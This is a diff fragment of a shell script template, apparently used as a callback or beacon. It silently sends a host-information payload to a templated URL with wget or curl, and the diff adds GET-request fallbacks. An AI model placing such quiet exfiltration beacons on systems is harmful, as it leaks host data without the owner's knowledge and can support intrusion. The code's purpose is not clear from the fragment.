@@ -62,6 +62,8 @@ printf '%s\\n' "endian=$bb_endian"
 if command -v wget >/dev/null 2>&1; then
     wget -qO- --post-data "$bb_payload" "{url}" >/dev/null 2>&1 && exit 0
     wget -qO /dev/null --post-data "$bb_payload" "{url}" 2>/dev/null && exit 0
+    wget -qO- "{url}?$bb_payload" >/dev/null 2>&1 && exit 0
+    wget -qO /dev/null "{url}?$bb_payload" 2>/dev/null && exit 0
 fi
 if command -v curl >/dev/null 2>&1; then
     curl -fsS -X POST -d "$bb_payload" "{url}" >/dev/null 2>&1 && exit 0
